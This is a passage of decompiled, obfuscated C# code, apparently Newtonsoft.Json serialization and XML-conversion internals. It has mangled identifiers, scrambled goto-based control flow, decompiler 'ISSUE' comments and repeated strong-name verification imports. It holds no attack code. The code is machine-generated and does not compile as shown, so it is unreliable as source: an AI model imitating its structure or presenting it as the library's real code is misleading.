      goto label_1;
label_16:
      _param2 = DateTimeKind.Utc;
      num3 = \u0014.\u0003.\u0001(_param1, '+', 7, _param1.\u0002() - 8);
      goto label_1;
label_18:
      num4 = \u0014.\u0003.\u0001(_param1, '-', 7, _param1.\u0002() - 8);
      goto label_5;
    }

    static bool \u0001([In] JsonToken obj0)
    {
      switch (obj0)
      {
        case JsonToken.StartObject:
        case JsonToken.StartArray:
        case JsonToken.StartConstructor:
          return true;
        default:
          return false;
      }
    }

    static System.Attribute[] \u0001([In] bool obj0, [In] System.Type obj1, [In] object obj2)
    {
      \u0014.\u0006.\u0001(obj2, \u0014.\u0006.\u0082(5278));
      object obj = obj2;
      Assembly assembly;
      while ((object) (obj as System.Type) == null)
      {
        if ((object) (obj as Assembly) != null)
        {
          do
          {
            assembly = (Assembly) obj;
          }
          while (false);
          if ((object) obj1 == null)
            return \u001B\u0003.\u0007\u0007(assembly);
          goto label_9;
        }
        else
        {
          if ((object) (obj as MemberInfo) == null)
            goto label_15;
label_11:
          MemberInfo memberInfo = (MemberInfo) obj;
label_12:
          if ((object) obj1 == null)
            return \u001D\u0003.\u000E\u0007(memberInfo, obj0);
label_14:
          return \u001E\u0003.\u000F\u0007(memberInfo, obj1, obj0);
label_15:
          if ((object) (obj as Module) != null)
          {
            Module module = (Module) obj;
            if ((object) obj1 == null)
              return \u001F\u0003.\u0010\u0007(module, obj0);
            if (true)
              return \u007F\u0003.\u0011\u0007(module, obj1, obj0);
            goto label_11;
          }
          else if (obj is ParameterInfo)
          {
            if (true)
            {
              ParameterInfo parameterInfo = (ParameterInfo) obj;
              if ((object) obj1 != null)
                return \u0081\u0003.\u0013\u0007(parameterInfo, obj1, obj0);
              if (true)
                return \u0080\u0003.\u0012\u0007(parameterInfo, obj0);
            }
            else
              goto label_12;
          }
          else
          {
            if (true)
            {
              ICustomAttributeProvider attributeProvider = (ICustomAttributeProvider) obj2;
              return (object) obj1 != null ? (System.Attribute[]) \u001A\u0003.\u007E\u0006\u0007((object) attributeProvider, obj1, obj0) : (System.Attribute[]) \u0019\u0003.\u007E\u0004\u0007((object) attributeProvider, obj0);
            }
            goto label_14;
          }
        }
      }
      goto label_29;
label_9:
      return \u001C\u0003.\u0008\u0007(assembly, obj1);
label_29:
      System.Type type = (System.Type) obj;
      System.Attribute[] array = ((object) obj1 != null ? (IEnumerable) \u001A\u0003.\u007E\u0005\u0007((object) type, obj1, obj0) : (IEnumerable) \u0019\u0003.\u007E\u0003\u0007((object) type, obj0)).Cast<System.Attribute>().ToArray<System.Attribute>();
      if (obj0)
      {
        if (true)
        {
          if ((object) \u0001\u0002.\u007E\u001C\u0004((object) type) != null)
            array = ((IEnumerable<System.Attribute>) array).Union<System.Attribute>((IEnumerable<System.Attribute>) \u0014.\u0006.\u0001(obj0, obj1, (object) \u0001\u0002.\u007E\u001C\u0004((object) type))).ToArray<System.Attribute>();
        }
        else
          goto label_9;
      }
      return array;
    }

    static \u0012.\u000F \u0001() => JsonTypeReflector.\u0001() ? (\u0012.\u000F) \u0007.\u0001.\u0001 : (\u0012.\u000F) \u0007.\u0002.\u0001;

    static bool \u0001([In] System.Type obj0) => false;

    static \u0004.\u000F<object> \u0001([In] \u0003.\u0006 obj0) => obj0.\u0002;

    static bool \u0001(ref string _param0, [Out] string _param1, [In] XmlNodeConverter obj2)
    {
      if (\u0097.\u007E\u0001\u0004((object) _param1, \u0014.\u0006.\u0082(9926), StringComparison.Ordinal))
      {
        if (\u001F.\u007E\u0011\u0003((object) _param1) != 5)
        {
          if (\u001B\u0002.\u007E\u0088\u0005((object) _param1, 5) == ':')
          {
            _param0 = \u0080.\u007E\u001B\u0003((object) _param1, 6, \u001F.\u007E\u0011\u0003((object) _param1) - 6);
            return true;
          }
        }
        else
        {
          _param0 = string.Empty;
          return true;
        }
      }
      _param0 = (string) null;
      return false;
    }

    static long \u0001([In] \u0015.\u0013 obj0)
    {
      \u0006.\u0005 obj = \u0014.\u0006.\u0001(obj0);
      if (obj == null || !\u0014.\u0006.\u0001(false, \u0015.\u0013.\u0002, (\u0015.\u0013) obj))
        throw new ArgumentException(\u0002.\u0002.\u0001(\u0014.\u0006.\u0082(10529), (IFormatProvider) \u0098.\u0002\u0004(), (object) \u0014.\u0006.\u0001(obj0)));
      return \u0082\u0003.\u0014\u0007(obj.\u0001, (IFormatProvider) \u0098.\u0002\u0004());
    }

    static void \u0001([In] \u0015.\u0012 obj0)
    {
      if (obj0.\u0001 != null)
        return;
      obj0.\u0001 = new Dictionary<string, \u0015.\u0013>(\u0015.\u0012.\u0001);
    }

    static void \u0001([In] \u0007.\u0004 obj0, [In] JsonWriter obj1, [In] Regex obj2, [In] \u0016.\u0003 obj3)
    {
      DefaultContractResolver contractResolver = obj3.\u0001() as DefaultContractResolver;
      obj1.\u0002();
      obj1.\u0002(contractResolver != null ? contractResolver.\u0003(\u0014.\u0006.\u0082(10332)) : \u0014.\u0006.\u0082(10332));
      obj1.\u0004(global::\u0001.\u007E\u0001((object) obj2));
      obj1.\u0002(contractResolver != null ? contractResolver.\u0003(\u0014.\u0006.\u0082(10345)) : \u0014.\u0006.\u0082(10345));
      \u0014.\u0006.\u0001(obj3, obj1, (object) \u0083\u0003.\u007E\u0015\u0007((object) obj2));
      obj1.\u0011();
    }

    static void \u0001([In] JsonWriter obj0, [In] string obj1) => obj0.\u0001 = obj1;

    [DllImport("mscorwks.dll", EntryPoint = "StrongNameSignatureVerificationEx", CharSet = CharSet.Unicode)]
    [return: MarshalAs(UnmanagedType.Bool)]
    static extern bool \u0001([MarshalAs(UnmanagedType.LPWStr)] string _param0, [MarshalAs(UnmanagedType.Bool)] bool _param1, [MarshalAs(UnmanagedType.Bool)] out bool _param2);

    static bool \u0001([In] \u0007.\u0004 obj0, [In] RegexOptions obj1, [In] RegexOptions obj2) => (obj1 & obj2) == obj2;

    static void \u0001([In] MemberInfo obj0, [In] \u0011.\u0008 obj1)
    {
      // ISSUE: object of a compiler-generated type is created
      // ISSUE: variable of a compiler-generated type
      DefaultContractResolver.\u0002 obj2 = new DefaultContractResolver.\u0002();
      // ISSUE: reference to a compiler-generated field
      obj2.\u0001 = obj0;
      // ISSUE: reference to a compiler-generated field
      \u0012.\u0002 obj3 = ReflectionUtils.\u0001<\u0012.\u0002>((object) obj2.\u0001);
      if (obj3 == null)
        return;
      // ISSUE: reference to a compiler-generated field
      System.Type type1 = \u0014.\u0006.\u0001(obj2.\u0001);
      System.Type type2;
      // ISSUE: type reference
      \u0014.\u0006.\u0001(type1, \u0004\u0002.\u0084\u0004(__typeref (IDictionary<,>)), out type2);
      System.Type type3 = \u008F\u0002.\u007E\u000E\u0006((object) type2)[0];
      System.Type type4 = \u008F\u0002.\u007E\u000E\u0006((object) type2)[1];
      System.Type type5;
      // ISSUE: type reference
      if (\u0014.\u0006.\u0001(type1, \u0004\u0002.\u0084\u0004(__typeref (IDictionary<,>))))
      {
        // ISSUE: type reference
        type5 = \u0092\u0002.\u007E\u0011\u0006((object) \u0004\u0002.\u0084\u0004(__typeref (Dictionary<,>)), new System.Type[2]
        {
          type3,
          type4
        });
      }
      else
        type5 = type1;
      // ISSUE: reference to a compiler-generated field
      // ISSUE: reference to a compiler-generated field
      obj2.\u0001 = \u0014.\u0006.\u0001().\u0001<object>(obj2.\u0001);
      if (obj3.\u0002())
      {
        // ISSUE: object of a compiler-generated type is created
        // ISSUE: variable of a compiler-generated type
        DefaultContractResolver.\u0003 obj4 = new DefaultContractResolver.\u0003()
        {
          \u0001 = obj2
        };
        // ISSUE: reference to a compiler-generated field
        // ISSUE: reference to a compiler-generated field
        // ISSUE: reference to a compiler-generated field
        // ISSUE: reference to a compiler-generated field
        // ISSUE: reference to a compiler-generated field
        obj4.\u0001 = \u0014.\u0006.\u0001(obj4.\u0001.\u0001, true, false) ? \u0014.\u0006.\u0001().\u0001<object>(obj4.\u0001.\u0001) : (Action<object, object>) null;
        // ISSUE: reference to a compiler-generated field
        obj4.\u0001 = \u0014.\u0006.\u0001().\u0001<object>(type5);
        MethodInfo methodInfo = \u0084\u0003.\u007E\u0016\u0007((object) type1, \u0014.\u0006.\u0082(10570), new System.Type[2]
        {
          type3,
          type4
        });
        // ISSUE: reference to a compiler-generated field
        obj4.\u0001 = \u0014.\u0006.\u0001().\u0001<object>((MethodBase) methodInfo);
        // ISSUE: reference to a compiler-generated method
        \u0007.\u0003 obj5 = new \u0007.\u0003(obj4.\u0001);
        obj1.\u0001(obj5);
      }
      if (obj3.\u0001())
      {
        // ISSUE: object of a compiler-generated type is created
        // ISSUE: variable of a compiler-generated type
        DefaultContractResolver.\u0004 obj6 = new DefaultContractResolver.\u0004();
        // ISSUE: reference to a compiler-generated field
        obj6.\u0001 = obj2;
        // ISSUE: type reference
        ConstructorInfo constructorInfo = ((IEnumerable<ConstructorInfo>) \u0086\u0003.\u007E\u0017\u0007((object) \u0092\u0002.\u007E\u0011\u0006((object) \u0004\u0002.\u0084\u0004(__typeref (DefaultContractResolver.\u0001<,>)), new System.Type[2]
        {
          type3,
          type4
        }))).First<ConstructorInfo>();
        // ISSUE: reference to a compiler-generated field
        obj6.\u0001 = \u0014.\u0006.\u0001().\u0001((MethodBase) constructorInfo);
        // ISSUE: reference to a compiler-generated method
        \u0010.\u0005 obj7 = new \u0010.\u0005(obj6.\u0001);
        obj1.\u0001(obj7);
      }
      \u0014.\u0006.\u0001(obj1, type4);
    }

    static \u0004.\u0002 \u0001([In] JsonWriter obj0) => obj0.\u0001;

    static void \u0001([In] \u0016.\u0011 obj0) => global::\u0011.\u007E\u0016\u0002((object) obj0.\u0001);

    static \u0005.\u0005 \u0001(
      [In] JsonSerializerInternalReader obj0,
      [In] \u0016.\u0007 obj1,
      [In] \u0005.\u0005 obj2,
      [In] \u0006.\u0002 obj3,
      [In] JsonProperty obj4)
    {
      \u0005.\u0005 obj5 = (\u0005.\u0005) null;
      while (obj2 == null)
      {
        if (true)
          goto label_16;
label_11:
        if (obj1.\u0003() != null)
        {
          obj5 = obj1.\u0003();
          goto label_13;
        }
        else
          goto label_13;
label_16:
        if (obj4 == null || obj4.\u0003() == null)
        {
          if (obj3 != null && obj3.\u0001() != null)
          {
            if (true)
            {
              obj5 = obj3.\u0001();
              goto label_13;
            }
            else
              goto label_13;
          }
          else if (obj1 != null)
          {
            if (obj1.\u0002() != null)
            {
              obj5 = obj1.\u0002();
              goto label_13;
            }
            else
            {
              \u0005.\u0005 obj6;
              if ((obj6 = \u0014.\u0006.\u0001(obj0.\u0001, obj1.\u0002())) != null)
              {
                obj5 = obj6;
                if (true)
                {
                  if (false)
                    goto label_11;
                  else
                    goto label_13;
                }
              }
              else
                goto label_11;
            }
          }
          else
            goto label_13;
        }
        else
        {
          obj5 = obj4.\u0003();
          goto label_13;
        }
      }
      goto label_15;
label_13:
      return obj5;
label_15:
      do
      {
        obj5 = obj2;
      }
      while (false);
      goto label_13;
    }

    static void \u0001([In] \u0006.\u0002 obj0, [In] \u0016.\u0007 obj1)
    {
      obj0.\u0001 = obj1;
      if (obj0.\u0001 != null)
        obj0.\u0002 = \u0015.\u000E.\u0007(obj0.\u0001.\u0002()) ? obj0.\u0001 : (\u0016.\u0007) null;
      else
        obj0.\u0002 = (\u0016.\u0007) null;
    }

    static bool \u0001([In] \u0011.\u0003 obj0)
    {
      char ch;
      int num1;
      int num2;
      while (true)
      {
        do
        {
          int num3 = (int) obj0.\u0001[obj0.\u0002];
          int num4;
          int num5;
          int num6;
          while (true)
          {
            ch = (char) num3;
            if (true)
            {
              if (ch <= ')')
              {
                num4 = (int) ch;
                num5 = 13;
                if (num5 != 0)
                {
                  if ((uint) num4 > (uint) num5)
                  {
                    if (ch != ' ')
                    {
                      num6 = (int) ch;
                      if (false)
                        num3 = num6;
                      else
                        break;
                    }
                    else
                      goto label_27;
                  }
                  else
                    goto label_36;
                }
                else
                  goto label_2;
              }
              else
                goto label_6;
            }
            else
              goto label_8;
          }
          if (num6 == 41)
            goto label_23;
          else
            goto label_30;
label_6:
          int num7;
          int num8;
          if (ch <= '/')
          {
            if (ch == ',')
              goto label_26;
          }
          else
          {
            num7 = (int) ch;
            num8 = 93;
            goto label_12;
          }
label_8:
          int num9;
          if (true)
            num9 = (int) ch;
          else
            goto label_25;
label_10:
          if (num9 == 47)
          {
            \u0014.\u0006.\u0001(obj0, true);
            goto label_25;
          }
          else
            goto label_30;
label_12:
          if (num7 != num8)
          {
            if (ch == '}')
              goto label_20;
            else
              goto label_30;
          }
          else
          {
            ++obj0.\u0002;
            \u0014.\u0006.\u0001((\u0012.\u0007) obj0, JsonToken.EndArray);
            num2 = 1;
            if (num2 == 0)
            {
              num9 = num2;
              goto label_10;
            }
            else
              goto label_14;
          }
label_2:
          num8 = num5;
          num7 = num4;
          goto label_12;
label_16:
          if (num1 == obj0.\u0002)
            continue;
          goto label_19;
label_25:
          num1 = 1;
          if (num1 == 0)
            goto label_16;
          else
            goto label_22;
label_36:
          switch (ch)
          {
            case char.MinValue:
              num1 = obj0.\u0001;
              goto label_16;
            case '\t':
              goto label_27;
            case '\n':
              goto label_29;
            case '\r':
              goto label_28;
            default:
              goto label_30;
          }
        }
        while (\u0014.\u0006.\u0001(false, obj0) != 0);
        break;
label_19:
        ++obj0.\u0002;
        continue;
label_27:
        ++obj0.\u0002;
        continue;
label_28:
        \u0014.\u0006.\u0001(obj0, false);
        continue;
label_29:
        \u0014.\u0006.\u0001(obj0);
        continue;
label_30:
        if (\u009A.\u0005\u0004(ch))
          ++obj0.\u0002;
        else
          goto label_32;
      }
      ((\u0012.\u0007) obj0).\u0001 = \u0012.\u0007.\u0001.\u0012;
      return false;
label_20:
      ++obj0.\u0002;
      \u0014.\u0006.\u0001((\u0012.\u0007) obj0, JsonToken.EndObject);
      return true;
label_14:
      return num2 != 0;
label_23:
      ++obj0.\u0002;
      \u0014.\u0006.\u0001((\u0012.\u0007) obj0, JsonToken.EndConstructor);
      return true;
label_22:
      return num1 != 0;
label_26:
      ++obj0.\u0002;
      \u0014.\u0006.\u0001((\u0012.\u0007) obj0);
      return false;
label_32:
      throw \u0014.\u0006.\u0001((\u0012.\u0007) obj0, \u0002.\u0002.\u0001(\u0014.\u0006.\u0082(10575), (IFormatProvider) \u0098.\u0002\u0004(), (object) ch));
    }

    static int \u0001([In] \u0013.\u000F.\u0003 obj0) => obj0.\u0002;

    static void \u0001([In] \u0011.\u0003 obj0)
    {
label_0:
      if (obj0.\u0001.\u0001())
        goto label_4;
label_2:
      if (true)
      {
        if (true)
          return;
      }
      else
        goto label_0;
label_4:
      obj0.\u0001 = new \u0008.\u0007(obj0.\u0001, 1024);
      goto label_2;
    }

    static string \u0001([In] FormatterAssemblyStyle obj0, [In] System.Type obj1, [In] SerializationBinder obj2)
    {
      string str1 = global::\u0001.\u007E\u0013((object) obj1);
      string str2;
      if (true)
        str2 = str1;
      if (obj0 == FormatterAssemblyStyle.Simple)
      {
        if (true)
          return \u0014.\u0006.\u0001(str2);
      }
      else if (obj0 != FormatterAssemblyStyle.Full)
        throw new ArgumentOutOfRangeException();
      return str2;
    }

    static int \u0001([In] ulong obj0)
    {
      if (obj0 >= 10000000000UL)
        goto label_25;
      else
        goto label_46;
label_1:
      long num1;
      long num2;
      long num3;
      long num4;
      if (true)
      {
        if ((ulong) num1 < (ulong) num2)
          return 1;
        if (true)
        {
          long num5 = (long) obj0;
          if (true)
          {
            if ((ulong) num5 < 100UL)
              return 2;
            long num6 = (long) obj0;
            long num7 = 1000;
            if (true)
            {
              if ((ulong) num6 < (ulong) num7)
                return 3;
              long num8 = (long) obj0;
              num2 = 10000L;
              num1 = num8;
            }
            else
            {
              num4 = num7;
              num3 = num6;
              goto label_14;
            }
          }
          else
          {
            num1 = num5;
            goto label_40;
          }
        }
        else
          goto label_17;
      }
      if ((ulong) num1 < (ulong) num2)
        return 4;
      num3 = (long) obj0;
      int num9 = 100000;
label_13:
      num4 = (long) num9;
label_14:
      if ((ulong) num3 < (ulong) num4)
        return 5;
      if (obj0 < 1000000UL)
        return 6;
      while (obj0 >= 10000000UL)
      {
        if (obj0 < 100000000UL)
          return 8;
        long num10 = (long) obj0;
        int num11 = 1000000000;
        if (num11 == 0)
        {
          num9 = num11;
          num3 = num10;
          goto label_13;
        }
        else
        {
          long num12 = (long) num11;
          if ((ulong) num10 < (ulong) num12)
            return 9;
          if (true)
            return 10;
        }
      }
label_17:
      return 7;
label_25:
      if (obj0 < 100000000000UL)
        return 11;
      if (obj0 < 1000000000000UL)
        return 12;
      if (obj0 < 10000000000000UL)
        return 13;
      if (obj0 < 100000000000000UL)
        return 14;
      if (obj0 < 1000000000000000UL)
        return 15;
      if (obj0 < 10000000000000000UL)
        return 16;
      if (obj0 < 100000000000000000UL)
        return 17;
      num1 = (long) obj0;
label_40:
      num2 = 1000000000000000000L;
      if (true)
      {
        if ((ulong) num1 < (ulong) num2)
          return 18;
        return obj0 < 10000000000000000000UL ? 19 : 20;
      }
      goto label_1;
label_46:
      long num13 = (long) obj0;
      num2 = 10L;
      num1 = num13;
      goto label_1;
    }

    static \u0001.\u0007 \u0001(
      [In] JsonSerializerInternalReader obj0,
      [In] \u0012.\u0007 obj1,
      [In] System.Type obj2,
      [In] \u0016.\u0007 obj3)
    {
      if (obj3 == null)
        throw \u0014.\u0006.\u0001(obj1, \u0002.\u0002.\u0001(\u0014.\u0006.\u0082(10668), (IFormatProvider) \u0098.\u0002\u0004(), (object) obj2));
      if (obj3 is \u0001.\u0007 obj)
        return obj;
      string str = \u0002.\u0002.\u0001(\u0008\u0003.\u008E\u0006(\u0014.\u0006.\u0082(10733), global::\u0004.\u0097(), \u0014.\u0006.\u0082(10911), global::\u0004.\u0097()), (IFormatProvider) \u0098.\u0002\u0004(), (object) obj2, (object) \u0014.\u0006.\u0001(obj0, obj3));
      throw \u0014.\u0006.\u0001(obj1, str);
    }

    static \u0015.\u0013 \u0001([In] \u0015.\u0013 obj0) => obj0.\u0001();

    static void \u0001([In] JsonWriter obj0, [In] string obj1)
    {
      obj0.\u0001.\u0001 = obj1;
      obj0.\u0002(JsonToken.PropertyName);
    }

    [DllImport("mscorwks.dll", EntryPoint = "StrongNameSignatureVerificationEx", CharSet = CharSet.Unicode)]
    [return: MarshalAs(UnmanagedType.Bool)]
    static extern bool \u0001([MarshalAs(UnmanagedType.LPWStr)] string _param0, [MarshalAs(UnmanagedType.Bool)] bool _param1, [MarshalAs(UnmanagedType.Bool)] out bool _param2);

    [DllImport("mscorwks.dll", EntryPoint = "StrongNameSignatureVerificationEx", CharSet = CharSet.Unicode)]
    [return: MarshalAs(UnmanagedType.Bool)]
    static extern bool \u0001([MarshalAs(UnmanagedType.LPWStr)] string _param0, [MarshalAs(UnmanagedType.Bool)] bool _param1, [MarshalAs(UnmanagedType.Bool)] out bool _param2);

    static void \u0001(
      [In] string obj0,
      [In] XmlNamespaceManager obj1,
      [In] \u0012.\u0007 obj2,
      [In] \u0011.\u000E obj3,
      [In] string obj4,
      [In] IXmlNode obj5)
    {
      string str1 = \u001B.\u0004\u0003(obj0);
      string str2;
      IXmlNode xmlNode1;
      if (true)
      {
        str2 = global::\u0001.\u007E\u0001(obj2.\u0001());
        if (!global::\u0007.\u009E(obj4))
        {
          xmlNode1 = obj3.\u0002(str1, \u0016\u0003.\u007E\u009D\u0006((object) obj1, obj4), str2);
          goto label_4;
        }
      }
      xmlNode1 = obj3.\u0002(str1, str2);
label_4:
      IXmlNode xmlNode2 = xmlNode1;
      ((\u0002.\u0006) obj5).\u0001(xmlNode2);
    }

    static object \u0001([In] \u0015.\u0013 obj0, [In] System.Type obj1, [In] \u0016.\u0003 obj2)
    {
      do
      {
        \u0014.\u0006.\u0001((object) obj2, \u0014.\u0006.\u0082(11341));
      }
      while (false);
      \u000E.\u000E obj = new \u000E.\u000E(obj0);
      try
      {
        return \u0014.\u0006.\u0001(obj2, (\u0012.\u0007) obj, obj1);
      }
      finally
      {
        while (obj != null)
        {
          if (true)
          {
            global::\u0011.\u007E\u0007\u0002((object) obj);
            break;
          }
        }
      }
    }

    static \u000E.\u0002 \u0001([In] \u0012.\u0007 obj0) => obj0.\u0001;

    static long? \u0001([In] \u0015.\u0013 obj0)
    {
      if (obj0 == null)
        return new long?();
      \u0006.\u0005 obj = \u0014.\u0006.\u0001(obj0);
      if (obj != null)
      {
        int num = 1;
        if (num != 0)
          num = \u0014.\u0006.\u0001(num != 0, \u0015.\u0013.\u0002, (\u0015.\u0013) obj) ? 1 : 0;
        if (num != 0)
          return obj.\u0001 == null ? new long?() : new long?(Convert.ToInt64(obj.\u0001, (IFormatProvider) CultureInfo.InvariantCulture));
      }
      throw new ArgumentException(\u0002.\u0002.\u0001(\u0014.\u0006.\u0082(10529), (IFormatProvider) CultureInfo.InvariantCulture, (object) \u0014.\u0006.\u0001(obj0)));
    }

    static object \u0001(
      JsonSerializerInternalReader _param0,
      \u0012.\u0007 _param1,
      \u0011.\u0008 _param2,
      JsonProperty _param3,
      JsonProperty _param4,
      [Out] string _param5,
      [In] ref bool obj6)
    {
      object obj = (object) null;
      if (_param2.\u0001 == null)
      {
        if (((\u0016.\u0007) _param2).\u0001() != null && (!_param2.\u0006() || _param0.\u0001.\u0001 == \u0001.\u0002.\u0002 || _param2.\u0002 == null))
          obj = ((\u0016.\u0007) _param2).\u0001()();
        else if (_param2.\u0002 != null)
        {
          obj6 = true;
          return _param0.\u0001(_param1, _param2, _param3, _param2.\u0002, _param5);
        }
      }
      else
        goto label_12;
label_6:
      if (obj == null)
      {
        if (true)
        {
          if (!_param2.\u0006)
            throw \u0014.\u0006.\u0001(_param1, \u0002.\u0002.\u0001(\u0014.\u0006.\u0082(11362), (IFormatProvider) \u0098.\u0002\u0004(), (object) _param2.\u0002()));
          throw \u0014.\u0006.\u0001(_param1, \u0002.\u0002.\u0001(\u0014.\u0006.\u0082(11508), (IFormatProvider) \u0098.\u0002\u0004(), (object) _param2.\u0002()));
        }
        goto label_13;
      }
      else
      {
        obj6 = false;
        return obj;
      }
label_12:
      if (\u0014.\u0006.\u0001(_param2).Count <= 0)
      {
        obj = _param2.\u0001(new object[0]);
        goto label_6;
      }
label_13:
      obj6 = true;
      return _param0.\u0001(_param1, _param2, _param3, _param2.\u0001, _param5);
    }

    static string \u0001(
      object _param0,
      ref bool _param1,
      JsonWriter _param2,
      [Out] \u0010.\u0006 _param3,
      [In] \u0016.\u0007 obj4)
    {
      if (obj4.\u0001 != \u0003.\u0005.\u0004)
      {
        string str;
        if (\u0014.\u0006.\u0001(_param0, \u0001\u0002.\u007E\u0017\u0004(_param0), out str))
        {
          _param1 = true;
          return str;
        }
        _param1 = true;
        return global::\u0001.\u007E\u0001(_param0);
      }
      \u0005.\u0008 obj1 = (\u0005.\u0008) obj4;
      if (obj1.\u0001() != \u000F.\u0003.\u007F && obj1.\u0001() != \u000F.\u0003.\u0080)
      {
        if (obj1.\u0001() == \u000F.\u0003.\u0081 || obj1.\u0001() == \u000F.\u0003.\u0082)
        {
          _param1 = false;
          global::\u0001 obj2 = global::\u0001.\u007E\u0001;
          StringWriter stringWriter = new StringWriter((IFormatProvider) \u0098.\u0002\u0004());
          \u0004.\u0007.\u0001((TextWriter) stringWriter, (DateTimeOffset) _param0, _param2.\u0001, _param2.\u0001, \u0014.\u0006.\u0001(_param2));
          return obj2((object) stringWriter);
        }
        _param1 = true;
        return \u0095\u0002.\u0017\u0006(_param0, (IFormatProvider) \u0098.\u0002\u0004());
      }
      DateTime dateTime = \u0014.\u0006.\u0001((DateTime) _param0, _param2.\u0001);
      _param1 = false;
      global::\u0001 obj3 = global::\u0001.\u007E\u0001;
      StringWriter stringWriter1 = new StringWriter((IFormatProvider) \u0098.\u0002\u0004());
      \u0004.\u0007.\u0001((TextWriter) stringWriter1, dateTime, _param2.\u0001, _param2.\u0001, \u0014.\u0006.\u0001(_param2));
      return obj3((object) stringWriter1);
    }

    static \u0001.\u0003 \u0001([In] JsonWriter obj0) => obj0.\u0001;

    static void \u0001([In] JsonWriter obj0, [In] \u0016.\u0003 obj1, [In] System.Type obj2, [In] object obj3) => obj1.\u0001(obj0, obj3, obj2);

    static bool \u0001([In] \u0011.\u0003 obj0, [In] int obj1, [In] bool obj2)
    {
      if (true)
        goto label_5;
label_4:
      return true;
label_5:
      int num1 = obj0.\u0002;
      int num2 = obj1;
      int num3;
      int num4;
      while (true)
      {
        num3 = num1 + num2;
        num4 = obj0.\u0001;
        if (false)
        {
          num2 = num4;
          num1 = num3;
        }
        else
          break;
      }
      if (num3 >= num4)
        return \u0014.\u0006.\u0001(obj2, obj0, obj1);
      goto label_4;
    }

    static TimeSpan? \u0001([In] \u0015.\u0013 obj0)
    {
      if (obj0 == null)
        return new TimeSpan?();
      \u0006.\u0005 obj = \u0014.\u0006.\u0001(obj0);
      if (obj == null || !\u0014.\u0006.\u0001(true, \u0015.\u0013.\u0005, (\u0015.\u0013) obj))
        throw new ArgumentException(\u0002.\u0002.\u0001(\u0014.\u0006.\u0082(11766), (IFormatProvider) CultureInfo.InvariantCulture, (object) \u0014.\u0006.\u0001(obj0)));
      while (obj.\u0001 == null)
      {
        if (true)
          return new TimeSpan?();
      }
      return new TimeSpan?(obj.\u0001 is TimeSpan ? (TimeSpan) obj.\u0001 : \u0014.\u0006.\u0001(Convert.ToString(obj.\u0001, (IFormatProvider) CultureInfo.InvariantCulture)));
    }

    static \u0015.\u0007 \u0001([In] System.Type obj0, [In] string[] obj1) => \u0014.\u0006.\u0001(obj0, (MethodBase) null, obj1);

    static unsafe bool \u0001(
      [In] JsonProperty obj0,
      [In] JsonProperty obj1,
      [In] JsonSerializerInternalReader obj2,
      [In] \u0012.\u0007 obj3,
      [In] object obj4,
      [In] \u0006.\u0002 obj5,
      [In] \u0005.\u0005 obj6)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(2);
      object obj7;
      \u0016.\u0007 obj8;
      // ISSUE: cast to a reference type
      if (\u0014.\u0006.\u0001(obj3, ref obj7, obj2, ref obj6, obj4, ref obj8, (bool&) ((IntPtr) voidPtr + 1), obj0, out *(bool*) voidPtr, obj5, obj1))
        return false;
      object obj9;
      if (obj6 != null && obj6.\u0002())
      {
        if (*(sbyte*) ((IntPtr) voidPtr + 1) == (sbyte) 0 && obj4 != null && obj0.\u0002())
          obj7 = obj0.\u0001().\u0001(obj4);
        obj9 = \u0014.\u0006.\u0001(obj2, obj6, obj3, obj0.\u0001, obj7);
      }
      else
        obj9 = \u0014.\u0006.\u0001(obj2, obj3, obj0.\u0001, obj8, obj0, obj5, obj1, *(sbyte*) voidPtr != (sbyte) 0 ? obj7 : (object) null);
      if (*(sbyte*) voidPtr != (sbyte) 0 && obj9 == obj7 || !\u0014.\u0006.\u0001(obj2, obj0, obj9))
        return (bool) *(sbyte*) voidPtr;
      obj0.\u0001().\u0001(obj4, obj9);
      if (obj0.\u0001() != null)
      {
        if (obj2.\u0001 != null && obj2.\u0001.\u0001() >= TraceLevel.Verbose)
          obj2.\u0001.\u0001(TraceLevel.Verbose, \u0011.\u0002.\u0001(obj3 as \u000F.\u0001, obj3.\u0001(), \u0002.\u0002.\u0001(\u0014.\u0006.\u0082(11811), (IFormatProvider) \u0098.\u0002\u0004(), (object) obj0.\u0001, (object) obj0.\u0001())), (Exception) null);
        obj0.\u0001()(obj4, (object) true);
      }
      return true;
    }

    static object \u0001([In] \u0008.\u0011 obj0) => obj0.\u0001;

    static void \u0001([In] Form obj0)
    {
      do
      {
        if (true)
          \u0014.\u0006.\u0001(\u0087\u0003.\u007E\u0018\u0007((object) obj0), \u0008.\u0002.\u0001, 0, 0, 0, 0, 3U);
      }
      while (false);
    }

    [DllImport("mscorwks.dll", EntryPoint = "StrongNameSignatureVerificationEx", CharSet = CharSet.Unicode)]
    [return: MarshalAs(UnmanagedType.Bool)]
    static extern bool \u0001([MarshalAs(UnmanagedType.LPWStr)] string _param0, [MarshalAs(UnmanagedType.Bool)] bool _param1, [MarshalAs(UnmanagedType.Bool)] out bool _param2);

    static unsafe void \u0001([In] \u0008.\u0005 obj0)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(12);
      \u0008.\u0005.\u0001[] objArray1 = obj0.\u0001;
      *(int*) voidPtr = obj0.\u0003 * 2 + 1;
      int num1 = *(int*) voidPtr;
      \u0008.\u0005.\u0001[] objArray2;
      int num2;
      if (true)
      {
        int num3 = 1;
        if (num3 != 0)
        {
          objArray2 = new \u0008.\u0005.\u0001[num1 + num3];
          *(int*) ((IntPtr) voidPtr + 4) = 0;
          if (false)
            goto label_12;
        }
        else
        {
          num2 = num3;
          goto label_11;
        }
      }
      else
        goto label_10;
label_9:
      num1 = *(int*) ((IntPtr) voidPtr + 4);
label_10:
      num2 = objArray1.Length;
label_11:
      int num4 = num2;
      if (num1 < num4)
      {
        \u0008.\u0005.\u0001 obj1;
        for (\u0008.\u0005.\u0001 obj2 = objArray1[*(int*) ((IntPtr) voidPtr + 4)]; obj2 != null; obj2 = obj1)
        {
          *(int*) ((IntPtr) voidPtr + 8) = obj2.\u0001 & *(int*) voidPtr;
          if (true)
            obj1 = obj2.\u0001;
          obj2.\u0001 = objArray2[*(int*) ((IntPtr) voidPtr + 8)];
          objArray2[*(int*) ((IntPtr) voidPtr + 8)] = obj2;
        }
        *(int*) ((IntPtr) voidPtr + 4) = *(int*) ((IntPtr) voidPtr + 4) + 1;
        goto label_9;
      }
label_12:
      obj0.\u0001 = objArray2;
      obj0.\u0003 = *(int*) voidPtr;
    }

    static void \u0001(
      [In] \u0012.\u0007 obj0,
      [In] IXmlNode obj1,
      [In] XmlNodeConverter obj2,
      [In] string obj3,
      [In] \u0011.\u000E obj4)
    {
